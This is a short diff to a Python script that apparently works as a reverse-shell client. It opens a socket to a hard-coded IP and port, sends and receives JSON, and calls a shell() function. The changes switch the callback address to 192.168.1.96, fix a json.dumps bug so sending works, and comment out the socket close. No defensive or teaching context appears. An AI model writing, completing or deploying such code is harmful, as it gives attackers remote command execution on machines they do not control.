@@ -6,7 +6,7 @@ import subprocess
 import json
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("192.168.1.148", 56789))
+s.connect(("192.168.1.96", 56789))
 
 
 # helper send and receive functions:
@@ -20,7 +20,7 @@ def json_recv():
 			continue
 
 def json_send(data):
-	json_data = json.dump(data)
+	json_data = json.dumps(data)
 	s.send(json_data)
 
 
@@ -44,7 +44,7 @@ def shell():
 
 
 shell()
-s.close()
+#s.close()
 
 
 
